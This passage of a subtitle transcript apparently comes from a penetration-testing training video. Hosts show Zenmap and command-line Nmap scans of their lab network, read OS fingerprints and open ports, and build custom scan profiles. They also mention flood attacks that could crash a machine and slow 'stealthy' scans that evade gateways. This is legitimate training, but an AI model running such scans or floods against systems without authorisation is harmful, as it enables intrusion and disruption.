[LAUGH]\n>> But if I multiplied this by five or six\n\n312\n00:15:37.530 --> 00:15:41.150\nand used a couple of different attacks,\ntop points to hit the same system.\n\n313\n00:15:41.150 --> 00:15:44.540\nI could actually theoretically\nchip away at enough resources,\n\n314\n00:15:44.540 --> 00:15:47.420\nenough bandwidth that I may\nactually crash the machine.\n\n315\n00:15:47.420 --> 00:15:49.770\nAnd that can be a problem and\nthat is something to be aware of.\n\n316\n00:15:49.770 --> 00:15:51.850\nSo we just wanna be aware of that, right?\n\n317\n00:15:51.850 --> 00:15:53.108\nAll right, let's take a look.\n\n318\n00:15:53.108 --> 00:15:54.209\nLet's switch tactics here.\n\n319\n00:15:54.209 --> 00:15:55.805\nI'm just gonna go kill that in Cali.\n\n320\n00:15:55.805 --> 00:15:58.997\n[LAUGH] So I'm not how to use\nNmap while we're doing this.\n\n321\n00:15:58.997 --> 00:16:02.708\nLet me just turn this\noff right quick in Cali.\n\n322\n00:16:02.708 --> 00:16:06.694\nWe'll just that break that control c,\nwill just be a universal escape key so\n\n323\n00:16:06.694 --> 00:16:08.330\nwe can just get out of that.\n\n324\n00:16:08.330 --> 00:16:10.147\nLeave HP3 there for the minute.\n\n325\n00:16:10.147 --> 00:16:12.218\nLet's come back over to\nour Windows machine.\n\n326\n00:16:12.218 --> 00:16:14.120\nWe'll see that traffic flood abate.\n\n327\n00:16:14.120 --> 00:16:15.220\nWe have a lot of other traffic but\n\n328\n00:16:15.220 --> 00:16:18.930\nnotice it's not wall to wall,\ntcp packets just non stop now.\n\n329\n00:16:18.930 --> 00:16:21.510\nWe're getting a lot of other\nprotocol traffic again, right?\n\n330\n00:16:21.510 --> 00:16:23.240\nSo just be aware of that.\n\n331\n00:16:23.240 --> 00:16:26.270\nSo now what we can do we'll just leave\nthis running in the background so\n\n332\n00:16:26.270 --> 00:16:29.820\nwe can see some additional traffic\nbeing captured, so we'll minimize that.\n\n333\n00:16:29.820 --> 00:16:33.830\nJust give that a second to go down, and\nwhat we're gonna do is we're gonna bring\n\n334\n00:16:33.830 --> 00:16:36.850\nup, and I already have it up and running,\nso let me just load it back up here.\n\n335\n00:16:36.850 --> 00:16:39.380\nYou can see it's kind of\ncoming up slowly but surely.\n\n336\n00:16:39.380 --> 00:16:43.840\nWe have Zenmap which, remember,\nis the Windows port map for InMap.\n\n337\n00:16:43.840 --> 00:16:47.900\nAnd we've installed this, we just\nhave to go get the distributable from\n\n338\n00:16:47.900 --> 00:16:52.640\nthe end map org website,\ndownload it, and put it in.\n\n339\n00:16:52.640 --> 00:16:57.080\nWe did that, we ran it,\nnow I went ahead and I ran a scan already.\n\n340\n00:16:57.080 --> 00:16:59.830\nI did this about an hour ago so\nwe'd have it ready to go.\n\n341\n00:16:59.830 --> 00:17:02.580\nAgainst our IP range using a Wild Card.\n\n342\n00:17:02.580 --> 00:17:04.090\nSo we support Wild Cards.\n\n343\n00:17:04.090 --> 00:17:07.360\nWe could see in the target\narea a 101230 asterisk.\n\n344\n00:17:07.360 --> 00:17:12.080\nSo all the hosts on the 101230\nsubnet here at ITProTV.\n\n345\n00:17:12.080 --> 00:17:16.030\nNetwork, and then I ran\nan intense scan which it sets up\n\n346\n00:17:16.030 --> 00:17:18.730\nthe little script here for\nme in the chat window.\n\n347\n00:17:18.730 --> 00:17:21.680\nWe've been having some backing and\nforthing on the use of a script,\n\n348\n00:17:21.680 --> 00:17:25.285\nthat Mike was kind enough to throw in\nthere and say, hey, man, I wanna try this.\n\n349\n00:17:25.285 --> 00:17:27.085\nLooks like we had a little\nbit of adjustment\n\n350\n00:17:27.085 --> 00:17:28.535\nto get it working the right way.\n\n351\n00:17:28.535 --> 00:17:31.445\nBut you can get these scripts\nauto-generated by choosing\n\n352\n00:17:31.445 --> 00:17:34.565\nessentially a profile that's\npre-populated in the tool.\n\n353\n00:17:34.565 --> 00:17:35.835\nOr you can make your own, right?\n\n354\n00:17:35.835 --> 00:17:37.175\nAnd so, you can do either one.\n\n355\n00:17:37.175 --> 00:17:38.912\nSo I just chose Windows intense scan.\n\n356\n00:17:38.912 --> 00:17:43.042\nBut you'll notice here, there is a pull\ndown menu of a very large variety of scans\n\n357\n00:17:43.042 --> 00:17:44.672\nthat are already prepopulated in here.\n\n358\n00:17:44.672 --> 00:17:48.952\nSo we can go in, and\nwe can do several different scan types.\n\n359\n00:17:48.952 --> 00:17:53.090\nAnd again, you can take a look at them,\nand use all sorts of different ones.\n\n360\n00:17:53.090 --> 00:17:56.450\nIf we do an intense scan,\nit does take a bit of time.\n\n361\n00:17:56.450 --> 00:17:58.570\nAnd so, I ran that out ahead.\n\n362\n00:17:58.570 --> 00:18:02.790\nI did that and then I get once it finishes\na list of all the host on the left hand\n\n363\n00:18:02.790 --> 00:18:06.300\nside here, I get a output for\n\n364\n00:18:06.300 --> 00:18:09.900\nessentially just what the scan did and\nsome information about it.\n\n365\n00:18:09.900 --> 00:18:14.870\nShows me for instance the post scan\nresults, shows me all of the RSA\n\n366\n00:18:14.870 --> 00:18:18.760\nkeys that were found on the various hosts,\nso it shows me what they were.\n\n367\n00:18:18.760 --> 00:18:22.660\nI can highlight an individual\nhost whatever it may be.\n\n368\n00:18:22.660 --> 00:18:30.160\nAnd I can then go in, I can look at ports\nthat are available, so I can see port 22,\n\n369\n00:18:30.160 --> 00:18:35.310\nport 443 on host 1, whatever 230.1 is.\n\n370\n00:18:35.310 --> 00:18:37.727\nWe see we have port 53 open.\n\n371\n00:18:37.727 --> 00:18:40.250\nWe've got port 80, port 3,000.\n\n372\n00:18:40.250 --> 00:18:42.630\nSo we've got Apache Hadoop running.\n\n373\n00:18:42.630 --> 00:18:44.890\nSo it gives us some information.\n\n374\n00:18:44.890 --> 00:18:49.450\nWe've got on host three, I've got\nsome additional stuff running there.\n\n375\n00:18:49.450 --> 00:18:51.150\nWe got VMC running.\n\n376\n00:18:51.150 --> 00:18:55.550\nLooks like we have some sort of Intel Port\nis being used for listening right,\n\n377\n00:18:55.550 --> 00:18:58.380\nsome sort of listening port\nthere drop there, SSHD,\n\n378\n00:18:58.380 --> 00:19:01.280\nyou've got a variety of\ndifferent stuff right.\n\n379\n00:19:01.280 --> 00:19:05.020\nAnd I can go in,\nI can explode out the topology and\n\n380\n00:19:05.020 --> 00:19:07.300\ndo a map here, this is all condensed down.\n\n381\n00:19:07.300 --> 00:19:11.610\nIt looks just like a little\ncolorful amulet of some kind.\n\n382\n00:19:11.610 --> 00:19:12.412\nI can go in.\n\n383\n00:19:12.412 --> 00:19:15.940\nI can go in and\nlook at the host viewer here and\n\n384\n00:19:15.940 --> 00:19:18.550\nI can see general information, probe down.\n\n385\n00:19:18.550 --> 00:19:25.300\nI can see the operating system information\nmay be available by host, so I can go in.\n\n386\n00:19:25.300 --> 00:19:26.700\nI can take a look.\n\n387\n00:19:26.700 --> 00:19:30.270\nI can see that port's that are open here.\n\n388\n00:19:30.270 --> 00:19:34.268\nI can see class fingerprint match looks\nlike it's probably an Apple machine.\n\n389\n00:19:34.268 --> 00:19:38.029\nThis is what, 10.230.66.\n\n390\n00:19:38.029 --> 00:19:42.189\nWhoever that is, looks like they're\nrunning OS X 10.7 Mountain Lion or\n\n391\n00:19:42.189 --> 00:19:44.600\nEl Capitan or something like that.\n\n392\n00:19:44.600 --> 00:19:45.985\n>> That's it, I'm powering my laptop down.\n\n393\n00:19:45.985 --> 00:19:46.510\n[LAUGH]\n>> Okay.\n\n394\n00:19:46.510 --> 00:19:51.030\nSo I can go in and I can take a look and\nI can drill in and I can find\n\n395\n00:19:51.030 --> 00:19:56.580\nwhat that is gives me class and vendor\ntype, tells me the version of the OS.\n\n396\n00:19:56.580 --> 00:19:59.000\nThere may or may not be a finger\nprint associated with that.\n\n397\n00:19:59.000 --> 00:20:00.310\nIn this case, there isn't.\n\n398\n00:20:00.310 --> 00:20:05.800\nI can see or take a look at if there are\nany sequences down here, just essentially\n\n399\n00:20:05.800 --> 00:20:10.090\nwhat was being done with the time stamping\nso I could see what was done when.\n\n400\n00:20:10.090 --> 00:20:13.510\nI can look at services on the box,\nwhatever box this is.\n\n401\n00:20:13.510 --> 00:20:17.535\nI could see a list of the protocols and\nthe ports that are open there.\n\n402\n00:20:17.535 --> 00:20:19.108\nThis was all TCP.\n\n403\n00:20:19.108 --> 00:20:25.370\nLooks like I got ports 22,\n80, 88, 443, 445, 548.\n\n404\n00:20:25.370 --> 00:20:30.955\nLooks like a MySQL's running,\nVNC is running, so I can open them up and\n\n405\n00:20:30.955 --> 00:20:33.875\non any one of these I can see\nthe information that came back so\n\n406\n00:20:33.875 --> 00:20:39.295\nessentially it tells me yeah, this is\na VNC connection for Apple Remote Desktop\n\n407\n00:20:39.295 --> 00:20:44.632\nrunning on port Over 5900 must be a Mac or\na Mac operating system of some kind.\n\n408\n00:20:44.632 --> 00:20:47.492\nI can see the trace routes so\nI can go out and take a look.\n\n409\n00:20:47.492 --> 00:20:51.252\nI could do that just by going in and\npulling down the host viewer,\n\n410\n00:20:51.252 --> 00:20:57.760\nwhen I do the fish eyes we see here\nI can spread this out as you can see.\n\n411\n00:20:57.760 --> 00:21:04.500\nI can manipulate this around and\nmove it around and I can draw this out and\n\n412\n00:21:04.500 --> 00:21:09.470\nso I can, as I just click and\ngive it a second to kind of adjust.\n\n413\n00:21:09.470 --> 00:21:11.590\nIt's a little bit of latency as it moves.\n\n414\n00:21:11.590 --> 00:21:15.740\nI can manipulate this and\nsee different information.\n\n415\n00:21:15.740 --> 00:21:17.777\nIt works a little bit better when\nyou're not in the virtual environment.\n\n416\n00:21:17.777 --> 00:21:18.770\n[LAUGH]\n>> Yes it does.\n\n417\n00:21:18.770 --> 00:21:20.225\n>> It actually catches up with you.\n\n418\n00:21:20.225 --> 00:21:23.479\nBut I can see all the IP\naddresses as you can see there.\n\n419\n00:21:23.479 --> 00:21:26.390\nI can see them, array it around.\n\n420\n00:21:26.390 --> 00:21:27.650\nThat particular one.\n\n421\n00:21:27.650 --> 00:21:29.850\nI can right click on any one of these and\n\n422\n00:21:29.850 --> 00:21:34.750\nI can look at the output, the topology,\nthe host information, and architecture.\n\n423\n00:21:34.750 --> 00:21:37.340\nIt's a very detailed interface and\n\n424\n00:21:37.340 --> 00:21:41.775\nthey really have done a great job\nof capturing all this capabilities.\n\n425\n00:21:41.775 --> 00:21:45.945\nI can bring up the controls on the map\nhere through the fish eye viewer and\n\n426\n00:21:45.945 --> 00:21:50.745\nI can map out what I want, kind of\nthe view, the layout, the zoom in zoom out\n\n427\n00:21:50.745 --> 00:21:55.540\noptions, all that kind of stuff with\nthe spread factor so I can get it out.\n\n428\n00:21:55.540 --> 00:21:57.200\nMake a real nice graphic.\n\n429\n00:21:57.200 --> 00:22:00.140\nThen we have an option off the top\non the right here to save it.\n\n430\n00:22:00.140 --> 00:22:04.000\nWell I usually use the tool like this,\nmap it out when we do a pen test or\n\n431\n00:22:04.000 --> 00:22:05.020\nwe do an audit.\n\n432\n00:22:05.020 --> 00:22:07.150\nAnd we'll then get\na graphic of the network.\n\n433\n00:22:07.150 --> 00:22:09.636\nWe'll save it and then we can use\nthat in the documentation, right?\n\n434\n00:22:09.636 --> 00:22:14.230\nSo to present that to the customer, we\ncan make our notes on those particular IP\n\n435\n00:22:14.230 --> 00:22:19.050\naddresses and attach and you'll do all\nsorts of stuffs so that's really nice.\n\n436\n00:22:19.050 --> 00:22:20.820\nGives us that capability.\n\n437\n00:22:20.820 --> 00:22:22.600\nWe get the host details in here.\n\n438\n00:22:22.600 --> 00:22:26.923\nSo looks like 230.3 is running\nsome sort of Linux system,\n\n439\n00:22:26.923 --> 00:22:29.869\nwe can see that here, a Linux 2.6.9.\n\n440\n00:22:29.869 --> 00:22:31.719\nOur accuracy is 100%.\n\n441\n00:22:31.719 --> 00:22:32.500\nLooks like I'm pretty\nconfident about that.\n\n442\n00:22:32.500 --> 00:22:34.955\nI got a little the family\nof penguins up there.\n\n443\n00:22:34.955 --> 00:22:36.290\n>> [LAUGH]\n>> Right, so we know that.\n\n444\n00:22:36.290 --> 00:22:37.450\nBut we've got our uptime.\n\n445\n00:22:37.450 --> 00:22:39.030\nHere, we've got our open ports.\n\n446\n00:22:39.030 --> 00:22:42.132\nWe've got IP,\ninformation ports that are used.\n\n447\n00:22:42.132 --> 00:22:43.520\nYou could see what they are.\n\n448\n00:22:43.520 --> 00:22:47.360\nOS classes, most likely they will\nbe able to tell us what it is.\n\n449\n00:22:47.360 --> 00:22:49.710\nLinux tells us it's a general Linux build.\n\n450\n00:22:49.710 --> 00:22:51.710\nBut we've got all sorts of stuff here.\n\n451\n00:22:51.710 --> 00:22:55.710\nAnd now we can also see what kinda scans\nwere used, and what kinda scans were done.\n\n452\n00:22:55.710 --> 00:23:00.380\nSo using Nmap, or in this case\nthe Windows port Zenmap, we can go in and\n\n453\n00:23:00.380 --> 00:23:02.370\nget a great deal of detail.\n\n454\n00:23:02.370 --> 00:23:03.940\nPull down, and this was an intense scan.\n\n455\n00:23:03.940 --> 00:23:05.570\nIt pulls a lot of information.\n\n456\n00:23:05.570 --> 00:23:11.840\nSo it takes about 30 or 40 minutes to\nrun and we scan 254 hosts in the range.\n\n457\n00:23:11.840 --> 00:23:13.280\n>> That's a relatively small network.\n\n458\n00:23:13.280 --> 00:23:15.490\n>> Relatively small network and\nnot all the hosts were active.\n\n459\n00:23:15.490 --> 00:23:18.980\nWe only got about 30 or\nsomething hosts back, right, so\n\n460\n00:23:18.980 --> 00:23:20.920\nwe gotta keep that in mind as well.\n\n461\n00:23:20.920 --> 00:23:22.760\nNow some other things we\ncould do with the tool.\n\n462\n00:23:23.760 --> 00:23:25.760\nWe obviously could do targeted scans.\n\n463\n00:23:25.760 --> 00:23:28.950\nThere are a bunch of different ones here,\nregular, quick scan,\n\n464\n00:23:28.950 --> 00:23:31.940\nping scan, slow comprehensive scan.\n\n465\n00:23:31.940 --> 00:23:34.070\nYou may do slow scans to\nget in under the radar,\n\n466\n00:23:34.070 --> 00:23:37.265\nto try to sneak those packets\nin past gateway devices.\n\n467\n00:23:37.265 --> 00:23:39.875\nThe intense scan is what\nwe call a noisy scan.\n\n468\n00:23:39.875 --> 00:23:43.785\nIt's like full throttle, riding the Harley\ndown the middle of the aisle with\n\n469\n00:23:43.785 --> 00:23:45.945\nthe pipes wide open at 60 miles an hour.\n\n470\n00:23:45.945 --> 00:23:47.348\nEverybody hears you coming, right?\n\n471\n00:23:47.348 --> 00:23:51.226\nSo if you target that at an inbound\ngateway device we're gonna see that\n\n472\n00:23:51.226 --> 00:23:54.853\ncoming from a mile away and\nknow that that's what you're doing.\n\n473\n00:23:54.853 --> 00:23:57.647\nAnd we'll probably slam\nthat traffic lid closed And\n\n474\n00:23:57.647 --> 00:23:59.499\nprevent the scan from happening.\n\n475\n00:23:59.499 --> 00:24:02.635\nBut if we do a slow comprehensive\nscan from outside the border,\n\n476\n00:24:02.635 --> 00:24:07.110\nwe're gonna essentially send those packets\nin low and slow, fragmenting the scan.\n\n477\n00:24:07.110 --> 00:24:08.390\nSo, we're not doing it continuously.\n\n478\n00:24:08.390 --> 00:24:09.480\nIt's not noisy.\n\n479\n00:24:09.480 --> 00:24:12.740\nIt's gonna take a lot longer but it's what\nwe would essentially call a stealthy skin.\n\n480\n00:24:12.740 --> 00:24:16.160\nIt's gonna be much harder to find\nthat that skin is taking place.\n\n481\n00:24:16.160 --> 00:24:17.770\nSo, we do wanna be aware of that.\n\n482\n00:24:17.770 --> 00:24:21.930\nDo wanna think about that as well,\nthat is something else to consider, and\n\n483\n00:24:21.930 --> 00:24:24.220\nit's a question just how we go out and\n\n484\n00:24:24.220 --> 00:24:28.600\ntry to decide how to use this tool, but\nwe may wanna sneak in under the radar.\n\n485\n00:24:28.600 --> 00:24:30.970\nThis is definitely something to consider,\nand\n\n486\n00:24:30.970 --> 00:24:35.210\nsomething else that we may just want\nto be aware of so we can do that.\n\n487\n00:24:35.210 --> 00:24:38.220\nWe can also create our own profiles for\nour scans,\n\n488\n00:24:38.220 --> 00:24:41.490\nI'm gonna show you how to do that here,\nin just a minute.\n\n489\n00:24:41.490 --> 00:24:46.600\nSo, let's go in and let's say that\nwe wanna go to profile up here,\n\n490\n00:24:46.600 --> 00:24:50.430\nand we wanna create a new profile,\na new profile in the tool.\n\n491\n00:24:50.430 --> 00:24:51.340\nDo that.\n\n492\n00:24:51.340 --> 00:24:56.890\nWe then could go in,\ngive ourselves a profile name, AdamScan1,\n\n493\n00:24:56.890 --> 00:25:00.350\nor whatever we wanna call it,\nand then we go in and\n\n494\n00:25:00.350 --> 00:25:04.110\nwe essentially start enabling all\nof the things that we wanna do.\n\n495\n00:25:04.110 --> 00:25:06.340\nAnd we talked about switches and\nknowledge of switches,\n\n496\n00:25:06.340 --> 00:25:10.420\nright, case sensitivity and the fact\nthat that's something to consider.\n\n497\n00:25:10.420 --> 00:25:11.565\nWe see here we have,\n\n498\n00:25:11.565 --> 00:25:15.860\nyou enable all advanced aggressive\noptions minus upper case A.\n\n499\n00:25:15.860 --> 00:25:16.740\nThat's checked off.\n\n500\n00:25:16.740 --> 00:25:18.950\nWe see that in the scan string here, for\n\n501\n00:25:18.950 --> 00:25:21.930\nthe actual script minus\ncapital a right there.\n\n502\n00:25:21.930 --> 00:25:23.040\nWe can enable or disable.\n\n503\n00:25:23.040 --> 00:25:25.660\nWe want to do operating system protection,\nminus capital O.\n\n504\n00:25:25.660 --> 00:25:29.252\nAnd we just check that off,\nthat adds that to the scan.\n\n505\n00:25:29.252 --> 00:25:32.560\nWe put that in there, it's going to do\noperating system and aggressive scan.\n\n506\n00:25:32.560 --> 00:25:35.920\nSo, we're building our scan profile,\nessentially, just mixing and matching.\n\n507\n00:25:35.920 --> 00:25:39.035\n>> It's one of my favorite things about\nZenmap is the fact that you can learn your\n\n508\n00:25:39.035 --> 00:25:40.770\nswitches by checking those check marks,\nand\n\n509\n00:25:40.770 --> 00:25:42.080\nthen looking at that\nline right up at the top.\n\n510\n00:25:42.080 --> 00:25:43.030\n>> See what they do, absolutely.\n\n511\n00:25:43.030 --> 00:25:44.630\n>> And then,\nwhen you move to the Linux world and\n\n512\n00:25:44.630 --> 00:25:47.360\nyou need to write your own scripts,\nyou already know your switches.\n\n513\n00:25:47.360 --> 00:25:49.890\n>> You do, and I'm gonna show\nyou the equivalent of Nmap and\n\n514\n00:25:49.890 --> 00:25:51.230\nCal here in just a minute.\n\n515\n00:25:51.230 --> 00:25:53.717\nShow you that, unfortunately,\nwe don't have this option.\n\n516\n00:25:53.717 --> 00:25:55.280\n[LAUGH]\n>> You gotta essentially know\n\n517\n00:25:55.280 --> 00:25:57.800\nwhat you're doing as you write\nthe script out as Mike was pointing out.\n\n518\n00:25:57.800 --> 00:26:01.310\nSo, we do have to come in with a little\nprior or prerequisite knowledge, right?\n\n519\n00:26:01.310 --> 00:26:03.250\nBut it's good practice,\nand there's no shame.\n\n520\n00:26:03.250 --> 00:26:06.020\nI tell this to students and\nI tell this to customers all the time.\n\n521\n00:26:06.020 --> 00:26:06.840\nThey're like, well,\n\n522\n00:26:06.840 --> 00:26:09.490\nwe gotta use this thing in Windows because\nthere's no way we could do it in Linux.\n\n523\n00:26:09.490 --> 00:26:10.370\nYeah, because we just don't know.\n\n524\n00:26:10.370 --> 00:26:14.330\nAnd I say, there's never any\nshame in not knowing the stuff.\n\n525\n00:26:14.330 --> 00:26:17.520\nThe only shame is in you're not taking\nthe time to go figure it out if\n\n526\n00:26:17.520 --> 00:26:18.610\nyou need to do it.\n\n527\n00:26:18.610 --> 00:26:21.870\nAnd being too lazy to figure out\nonce you realize there's an option.\n\n528\n00:26:21.870 --> 00:26:24.350\nIf you're not clear,\nstart with the Windows version.\n\n529\n00:26:24.350 --> 00:26:27.650\nAs you could see, it's point and\nclick, it works the same way.\n\n530\n00:26:27.650 --> 00:26:30.570\nThere's no difference in the sense\nthat the output is the same, but\n\n531\n00:26:30.570 --> 00:26:34.230\nas Mike pointed out, it's very valid,\nvery important for us to consider.\n\n532\n00:26:34.230 --> 00:26:38.050\nRight, that we get that extra little\nbenefit of the interface and the help.\n\n533\n00:26:38.050 --> 00:26:40.210\nAnd it helps us to make good decisions.\n\n534\n00:26:40.210 --> 00:26:41.800\nI don't care how we get there.\n\n535\n00:26:41.800 --> 00:26:45.100\nI just care about making sure we scan the\nright stuff, and find the vulnerabilities.\n\n536\n00:26:45.100 --> 00:26:46.960\nThat's what my customer's\ngonna care about.\n\n537\n00:26:46.960 --> 00:26:48.170\nThat's what I gotta do.\n\n538\n00:26:48.170 --> 00:26:50.930\nSo, if I gotta do that by using\na Windows interface, great.\n\n539\n00:26:50.930 --> 00:26:53.660\nIf I'm good enough to do it in Linux,\nthen go do it in Linux.\n\n540\n00:26:53.660 --> 00:26:55.660\nAnd I'm gonna show you\nhow to do that right now.\n\n541\n00:26:55.660 --> 00:26:57.590\nSo, just keep that in mind and\nbe aware of that, okay?\n\n542\n00:26:57.590 --> 00:27:01.170\nAll right, so, we're gonna obviously\nsave the profile here, right?\n\n543\n00:27:01.170 --> 00:27:03.750\nAnd we can do that, so\nwe put in whatever we wanna do.\n\n544\n00:27:03.750 --> 00:27:05.850\nLet's go ahead and just do save changes.\n\n545\n00:27:05.850 --> 00:27:06.500\nWe have that.\n\n546\n00:27:06.500 --> 00:27:09.655\nAnd when we've done that,\nI happen to call it AdamScan so\n\n547\n00:27:09.655 --> 00:27:11.235\nit'll be at the top alphabetically.\n\n548\n00:27:11.235 --> 00:27:14.327\nBecause that's the value of having\na name that begins with the letter A.\n\n549\n00:27:14.327 --> 00:27:15.635\n>> [LAUGH]\n>> And so, you can see that my scan\n\n550\n00:27:15.635 --> 00:27:19.005\nprofile is now up there at the top and\nI just have it on the pick list.\n\n551\n00:27:19.005 --> 00:27:23.917\nI've got in the tools that I use for real,\nI've got a bunch of custom profiles that\n\n552\n00:27:23.917 --> 00:27:27.397\nI can load, or scans that I can load\nto be able to do certain things,\n\n553\n00:27:27.397 --> 00:27:30.957\ndepending on the topology and what the\ncustomer wants done, so that way I'm not\n\n554\n00:27:30.957 --> 00:27:35.007\njust going out there and trying to\nfigure it out as I go every time, right?\n\n555\n00:27:35.007 --> 00:27:37.830\nSo, I can do all that, no problem.\n\n556\n00:27:37.830 --> 00:27:39.060\nSo, let's go ahead.\n\n557\n00:27:39.060 --> 00:27:39.650\nLet's do the file.\n\n558\n00:27:39.650 --> 00:27:40.760\nLet's just minimize that.\n\n559\n00:27:42.200 --> 00:27:44.460\nLet's go back in here.\n\n560\n00:27:44.460 --> 00:27:48.185\nLet's come back over here to Kali,\nlet's just take a look.\n\n561\n00:27:48.185 --> 00:27:54.710\nJust log back in, of course, typing\nthe right password would be helpful.\n\n562\n00:27:54.710 --> 00:27:58.660\nBut let's log back in because it does time\nout after a couple minutes of inactivity.\n\n563\n00:27:58.660 --> 00:28:00.990\nLet's go ahead, and\nlet's load up and map some.\n\n564\n00:28:00.990 --> 00:28:03.460\nSo, I'm going to get rid of hpeg,\nI'm going to just close that out.\n\n565\n00:28:03.460 --> 00:28:05.990\nWe're going to go ahead and\ndo a little search here.\n\n566\n00:28:10.186 --> 00:28:12.640\nCome up, we'll do Nmap, right?\n\n567\n00:28:12.640 --> 00:28:14.400\nAnd you'll see, we have Zenmap.\n\n568\n00:28:14.400 --> 00:28:16.120\nWe can do Nmap, or Zenmap here.\n\n569\n00:28:16.120 --> 00:28:17.748\nWe'll do Nmap, hardcore, right?\n\n570\n00:28:17.748 --> 00:28:18.282\n>> Yeah.\n\n571\n00:28:18.282 --> 00:28:22.070\n[LAUGH]\n>> We don't need\n\n572\n00:28:22.070 --> 00:28:23.613\nno graphical interface, right?\n\n573\n00:28:23.613 --> 00:28:25.071\n[CROSSTALK] Just give us that console.\n\n574\n00:28:25.071 --> 00:28:26.540\nRight?\n\n575\n00:28:26.540 --> 00:28:27.270\nExactly.\n\n576\n00:28:27.270 --> 00:28:31.000\nInterfaces are for people that\ndon't understand consoles, right?\n\n577\n00:28:31.000 --> 00:28:32.442\nAll right, so we're gonna go ahead.\n\n578\n00:28:32.442 --> 00:28:35.672\nWe're gonna load up the hardcore\nversion and map here.\n\n579\n00:28:35.672 --> 00:28:38.388\nWe're gonna take a look at this\njust real quick on the flip side.\n\n580\n00:28:38.388 --> 00:28:42.210\nSo, we're gonna type in map, we are gonna\ngo ahead and type small s capital T.\n\n581\n00:28:42.210 --> 00:28:48.090\nWe are then gonna go ahead and\nput in capital T3,\n\n582\n00:28:48.090 --> 00:28:50.315\nwhoops, underscore,\nthat is not going to work too well.\n\n583\n00:28:50.315 --> 00:28:56.680\n[LAUGH] Alright, capital T3, and then\nwe are going to do minus capital A and\n\n584\n00:28:56.680 --> 00:29:00.854\nI need the IP address of our machine,\n\n585\n00:29:00.854 --> 00:29:04.371\nlet's do 10.1.230.223,\n\n586\n00:29:04.371 --> 00:29:09.990\nI tell you with that at\nleast like three copies and\n\n587\n00:29:09.990 --> 00:29:13.960\nI'm just useless when it comes for\nremembering all of this stuff.\n\n588\n00:29:13.960 --> 00:29:14.980\nAll right, so we have all that.\n\n589\n00:29:14.980 --> 00:29:17.820\nNow, we're gonna hit enter, all right.\n\n590\n00:29:17.820 --> 00:29:19.370\nSo, you see it's starting\nin map 701 there,\n\n591\n00:29:19.370 --> 00:29:23.920\nit's going out, and\ngive it a minute or so.\n\n592\n00:29:23.920 --> 00:29:30.010\nAnd then, what we're gonna do, eventually,\nis we're gonna get back information and\n\n593\n00:29:30.010 --> 00:29:32.770\nwe're gonna see something similar to\nwhat we did when we did the scan.\n\n594\n00:29:32.770 --> 00:29:36.630\nWe're going in and we're asking it to go\nahead and to scan the target, and we're\n\n595\n00:29:36.630 --> 00:29:40.720\ngonna scan the target IP in this case,\nthe Windows 8 machine that we were using.\n\n596\n00:29:40.720 --> 00:29:43.290\nAnd we're gonna see or\nwait for some results.\n\n597\n00:29:43.290 --> 00:29:46.400\nWe should see open ports,\nthings like that, that will come back.\n\n598\n00:29:46.400 --> 00:29:48.900\nWe may get operating system information.\n\n599\n00:29:48.900 --> 00:29:53.610\nWe may not, we may get information\nabout services running.\n\n600\n00:29:53.610 --> 00:29:57.910\nIt really just depends on what the machine\ngives back based on whether the firewall\n\n601\n00:29:57.910 --> 00:30:01.690\nis up, whether certain ports are running,\nyou have dropped the firewall\n\n602\n00:30:01.690 --> 00:30:05.710\non the system and get back information\nthat we may not get back otherwise.\n\n603\n00:30:05.710 --> 00:30:06.900\nThat kind of thing.\n\n604\n00:30:06.900 --> 00:30:10.595\nSo, we have to, obviously, wait for\nit to profile the machine and come back.\n\n605\n00:30:10.595 --> 00:30:13.570\nBut keep in mind that this can be done.\n\n606\n00:30:13.570 --> 00:30:18.280\nThe same way from the command line as\nwere showing you, as it would be from\n\n607\n00:30:18.280 --> 00:30:22.820\nthe graphical interface, we just have\nto wait for that information to return.\n\n608\n00:30:22.820 --> 00:30:24.490\nAnd again,\nit could take a little bit of time,\n\n609\n00:30:24.490 --> 00:30:29.010\nthe Nmap scan is not one of those things\nthat just boom happens right away.\n\n610\n00:30:29.010 --> 00:30:30.690\nSo, we just got the information back.\n\n611\n00:30:30.690 --> 00:30:32.260\nIt takes a couple of minutes.\n\n612\n00:30:32.260 --> 00:30:35.750\nThis is not an intense scan but\nthis is essentially a simple scan.\n\n613\n00:30:35.750 --> 00:30:37.300\n>> Right, were not doing an intense scan.\n\n614\n00:30:37.300 --> 00:30:39.290\nTense scan, we would have sat here for\n30 minutes.\n\n615\n00:30:39.290 --> 00:30:41.390\n>> Yep.\n>> Waiting on information to come back.\n\n616\n00:30:41.390 --> 00:30:46.395\nBut let's see if we can just\nroll up slowly without actually-\n\n617\n00:30:46.395 --> 00:30:47.960\n>> [LAUGH]\n\n618\n00:30:47.960 --> 00:30:49.720\n>> Causing the whole, now,\n\n619\n00:30:49.720 --> 00:30:51.733\nyou see I can't scroll up on the far side.\n\n620\n00:30:51.733 --> 00:30:53.140\n>> [LAUGH]\n>> There we go on the window.\n\n621\n00:30:53.140 --> 00:30:54.840\nThere is just a little bit of a delay.\n\n622\n00:30:54.840 --> 00:30:58.410\nSo, you can see now we have\nthe open ports listed there.\n\n623\n00:30:58.410 --> 00:31:01.550\nWe've got 135, 139,\nlooks like 445, 55 through 7.\n\n624\n00:31:01.550 --> 00:31:04.570\nAll coming back tag Microsoft.\n\n625\n00:31:04.570 --> 00:31:08.320\nWe would be pretty easy for\nus to understand.\n\n626\n00:31:08.320 --> 00:31:10.300\nAnd we would be remiss if we\ndidn't acknowledge that's probably\n\n627\n00:31:10.300 --> 00:31:13.380\nMicrosoft Operating Systems by\nlooking at open ports there.\n\n628\n00:31:13.380 --> 00:31:14.850\nRight, so we can see that.\n\n629\n00:31:14.850 --> 00:31:16.020\nGives us our Mac address.\n\n630\n00:31:16.020 --> 00:31:17.690\nComes back, tells us that.\n\n631\n00:31:17.690 --> 00:31:20.000\nTells us what operating\nsystem we're running.\n\n632\n00:31:20.000 --> 00:31:21.710\nNow, it says interestingly, right?\n\n633\n00:31:21.710 --> 00:31:25.074\nIt says Microsoft Windows 7, 2008 and or\n\n634\n00:31:25.074 --> 00:31:29.620\n8.1 with little pipes between them saying,\nit's running in one of these OS.\n\n635\n00:31:29.620 --> 00:31:31.280\nIt's not sure which one, right?\n\n636\n00:31:31.280 --> 00:31:33.740\nBut it's running one of these,\nso it's narrowing for us.\n\n637\n00:31:33.740 --> 00:31:35.560\n>> Right.\n>> We happen to know of course, obviously,\n\n638\n00:31:35.560 --> 00:31:36.430\nthis one is 8.1 machine.\n\n639\n00:31:36.430 --> 00:31:38.710\nWe did profile the 8.1 workstation.\n\n640\n00:31:38.710 --> 00:31:43.020\nSo, it does get 